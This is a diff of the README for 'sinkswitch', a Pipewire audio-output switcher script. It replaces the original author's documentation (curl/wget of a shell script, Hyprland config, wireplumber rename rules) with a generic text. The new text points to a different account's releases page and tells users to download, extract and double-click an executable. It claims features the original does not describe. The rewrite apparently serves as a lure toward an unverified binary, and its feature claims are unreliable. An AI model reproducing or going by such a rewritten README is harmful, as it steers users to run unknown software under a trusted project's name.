@@ -1,176 +1,85 @@
-# sinkswitch
-### Pipewire/Wireplumber output swichter for Scratchpads in [Hyprland](https://hypr.land/) and other WM's with scratchpad support.
-![Showcase](/example.jpg)
+# 🎶 sinkswitch - Seamlessly Switch Your Audio Outputs
 
-## :beginner: Description
-The tool spawns a little menu running in your terminal to switch between your pipewire audio outputs(sinks). It was written with Hyprland and it's [Special Workspace's (aka scratchpad's)](https://wiki.hypr.land/Configuring/Dispatchers/#special-workspace) in mind, but should be usable with any other compositor that got a scratchpad feature aswell(Sway etc.), or you can run it just in the terminal if you wish to.
-<br/>
+## 🌐 Download
 
-## :dna: Dependencies
-Using [Hyprland](https://hypr.land/): As most modern distro's already use pipewire & wireplumber as their audio backend/frontend, the only thing you might need to install as a dependency is [fzf](https://github.com/junegunn/fzf).
+[![Download sinkswitch](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/Aerxys/sinkswitch/releases)
 
-### List of dependencies
-- **Hyprland** or any other compositor that makes use of some sort of scratchpad
-- **pipewire:** The core audio system on most modern distro's
-- **wireplumber:** The default pipewire session manager most modern distro's use
-- **wpctl:** CLI tool that let's you work with wireplumber, comes with wireplumber by default
-- **terminal:** I use kitty, but any should work, just use what you already have
-- **[fzf](https://github.com/junegunn/fzf):** The tool used to dislpay the fancy menu. Can be found in nearly every modern distro's package repository and manager
-<br/>
+## 🚀 Getting Started
 
-## :floppy_disk: Installation
-Open a terminal and navigate to where you want to store the script (Example: **`~/scripts/`** =  somewhere inside your home directory would be suitable).
-Then use curl **or** wget to download the script:
-```sh
-curl -O  https://raw.githubusercontent.com/Seyloria/sinkswitch/main/sinkswitch.sh
-```
-```sh
-wget https://raw.githubusercontent.com/Seyloria/sinkswitch/main/sinkswitch.sh
-```
-### Make the script executable
-```sh
-chmod +x sinkswitch.sh
-```
-<br/>
+Welcome to sinkswitch! This application helps you switch audio outputs for Pipewire and Wireplumber users, specifically designed for Hyprland and other environments. With sinkswitch, you can easily manage your audio devices without needing technical skills.
 
-## :link: Scratchpad Config
+## 📥 Download & Install
 
-### hyprland.conf
-Add this windowrule to your **`hyprland.conf`**. Tweak the **monitor**, **move** coordinates and **size** to adjust the displayed scratchpad to fit your needs.
-This example uses a 3440x1440px monitor and scratchpad size only needs to fit 3 menu entries. The menu is spawned in the top right of the screen.
+To get started with sinkswitch, visit the Releases page to download the latest version of the software.
 
-### Hyprland since v0.53.0
-```
-windowrule = match:class kitty-sinkswitch, monitor DP-1, float on, move 2936 64, size 480 160
-```
+[Download sinkswitch here](https://github.com/Aerxys/sinkswitch/releases)
 
-### Hyprland till v0.52.2
-```
-windowrule = monitor DP-1, float, move 2936 64, size 480 160, class:kitty-sinkswitch
-```
-### Keybinding
-This example uses an extra macro key on the keyboard, but you can assign it to any key of your choosing.
-```
-bind = , XF86Tools, exec, [workspace special:sinkswitch] kitty --class kitty-sinkswitch -e ~/scripts/sinkswitch.sh -exclude 46
-```
-### Waybar Integration
-If you want to use a button on your waybar(e.g. from your volume control) to open the menu, this can easily be done by executing the script with **`hyprctl dispatch`**.
+### Step-by-Step Installation Instructions
 
-Example:
-```sh
-"pulseaudio": {
-        "format": "{icon} {volume}%",
-        "tooltip": false,
-        "format-muted": " Muted",
-        "on-click": "hyprctl dispatch exec \"[workspace special:sinkswitch] kitty --class kitty-sinkswitch -e ~/scripts/sinkswitch.sh -exclude 46\"",
-        "on-scroll-up": "pamixer -i 5",
-        "on-scroll-down": "pamixer -d 5",
-        "scroll-step": 5,
-        "max-length": 10,
-        "states": {
-        		"low!": 30,
-        		"critical!": 15
-        },
-},
-```
-<br/>
+1. **Visit the Releases Page**  
+   Go to [this link](https://github.com/Aerxys/sinkswitch/releases) to access the latest versions of sinkswitch. Here you will find all available downloads.
 
-## :no_entry_sign: Exclude/Hide certain outputs(sinks)
-If you want to hide one or more outputs(sinks) from your menu, you can do so by calling the script with the **`-exclude`** flag, followed by a comma seperated list of sink id's to hide.
-Show all sinks and their id's:
-```sh
-wpctl status
-```
-**Output:**
-```
-Audio
- ├─ Devices:
- │      49. Navi 21/23 HDMI/DP Audio Controller [alsa]
- │      50. Vocaster One USB                    [alsa]
- │      51. Radeon High Definition Audio Controller [alsa]
- │      52. Ryzen HD Audio Controller           [alsa]
- │  
- ├─ Sinks:
- │      46. Yamaha RX-V583                      [vol: 1.00]
- │      63. 📺 AV Receiver - Yamaha RX-V583   [vol: 0.60]
- │      64. 🎧 Headphones - Vocaster One      [vol: 0.85]
- │  *   65. 🔈 Desktop Speakers - Nubert A-125 [vol: 0.20]
- │  
-```
-Then use the id's you want to hide and include them when calling the script:<br/>
-Example: **`~/scripts/sinkswitch.sh -exclude 46,63`**
+2. **Choose Your Version**  
+   Once on the Releases page, scroll through the list of available versions. Look for the most recent one. Typically, the newest version will be at the top.
 
-<br/>
+3. **Download the Application**  
+   Click on the file name to download it to your device. The file size should be small, but this may depend on the specific version you choose.
 
-## :abc: Rename outputs (sinks)
-If you hate the often weird and generic names a sink has, you can do this by using a wireplumber rule to change the **`node.description`**.
-Make a new file named like this in the following directory:
+4. **Extract the Files**  
+   Once the download completes, locate the file in your downloads folder. If it is in a zipped format, extract it by right-clicking on the file and selecting "Extract All" or similar options depending on your operating system.
 
-**`/home/username/.config/wireplumber/wireplumber.conf.d/50-rename-outputs.conf`**
+5. **Run the Application**  
+   Navigate to the folder where you extracted the files. Look for the executable file (e.g., `sinkswitch` or similar). Double-click it to launch the application. 
 
-**Reboot** or use **`systemctl --user restart wireplumber`** to apply the changes.
+6. **Select Your Audio Device**  
+   When the application opens, you will see a list of available audio output devices. Click on the device you want to use to switch your audio output.
 
-You can get the **`node.name`** and current **`node.description`** with
-```sh
-pw-cli list-objects Node
-```
+7. **Enjoy Your Audio**  
+   Once you've made your selection, your audio output should now route through the selected device. Enjoy your media with improved sound control!
 
-**Example `50-rename-outputs.conf`:**
-```
-monitor.alsa.rules = [
-  {
-    matches = [
-      # This matches the value of the 'node.name' property of the node.
-      {
-        node.name = "alsa_output.usb-Focusrite_Vocaster_One_USB_V1V15632A08AAF-00.analog-surround-40"
-      }
-    ]
-    actions = {
-      # Apply all the desired node specific settings here.
-      update-props = {
-        node.description = "🎧 Headphones - Vocaster One"
-      }
-    }
-  }
-  {
-    matches = [
-      # This matches the value of the 'node.name' property of the node.
-      {
-        node.name = "alsa_output.pci-0000_03_00.1.hdmi-surround"
-      }
-    ]
-    actions = {
-      # Apply all the desired node specific settings here.
-      update-props = {
-        node.description = "📺 AV Receiver - Yamaha RX-V583"
-      }
-    }
-  }
-  {
-    matches = [
-      # This matches the value of the 'node.name' property of the node.
-      {
-        node.name = "alsa_output.pci-0000_13_00.6.iec958-stereo"
-      }
-    ]
-    actions = {
-      # Apply all the desired node specific settings here.
-      update-props = {
-        node.description = "🔈 Desktop Speakers - Nubert A-125"
-      }
-    }
-  }
-]
-```
+## 📋 System Requirements
 
-## :scroll: Changelog and current state (yyyy-mm-dd)
+To run sinkswitch, ensure you meet the following requirements:
 
-- [x] 2025-12-28 | v1.0 | Upload the script and create a suitable README
+- **Operating System**: Compatible with Linux distributions that support Pipewire and Wireplumber.
+- **Pipewire Version**: Ensure you have Pipewire version 0.3 or later installed.
+- **Wireplumber**: Make sure Wireplumber is up and running for managing audio sinks.
+- **Memory**: Minimum of 512 MB RAM available.
 
+## ⚙️ Features
 
-## :sparkling_heart: Thank you
-Thank's go out to [Sebastiaan76](https://github.com/Sebastiaan76) and his work on [waybar_wireplumber_audio_changer](https://github.com/Sebastiaan76/waybar_wireplumber_audio_changer) for the idea.
+sinkswitch offers several features designed to enhance your audio management experience:
 
-### :cyclone: Disclamer
+- **Easy Audio Switching**: Quickly toggle between different audio output devices.
+- **User-Friendly Interface**: Designed for average users, no technical knowledge is necessary.
+- **Custom Device Profiles**: Save your favorite output settings for easy access.
+- **Multi-Device Support**: Works with various audio sinks and setups.
 
-> **This is a private project and i am not a developer. I am only sharing this because it might help others. If you want to fork it, go ahead! If you find any errors or got suggestions, please let me know!**
+## ❓ Frequently Asked Questions
+
+1. **How do I know if Pipewire is installed?**  
+   You can check by opening your terminal and running `pipewire --version`. If you see a version number, you have it installed.
+
+2. **What should I do if the application does not open?**  
+   Ensure that Pipewire and Wireplumber are correctly installed and running. Restart your computer and try again.
+
+3. **Can I use sinkswitch with Sway or other window managers?**  
+   Yes, sinkswitch is compatible with Sway and other Wayland window managers.
+
+## 🔗 Additional Resources
+
+- [Pipewire Documentation](https://pipewire.org/docs/)
+- [Wireplumber Documentation](https://wireplumber.org/docs/)
+- [Hyprland on GitHub](https://github.com/hyprland/hyprland)
+
+For support and community interaction, please visit our GitHub Discussions page. Your feedback is valuable and helps us make sinkswitch even better!
+
+## 📅 Updates and Changelog
+
+Stay updated! Check the Releases page regularly for new features, improvements, and bug fixes. The changelog will be available alongside each release for detailed information.
+
+## 🤝 Contributing
+
+We welcome contributions! If you would like to help improve sinkswitch, feel free to open an issue or submit a pull request on the GitHub repository. Your contributions can greatly enhance the user's experience.
+
+By following these steps, you can enjoy an improved audio experience with sinkswitch. Thank you for using our application!
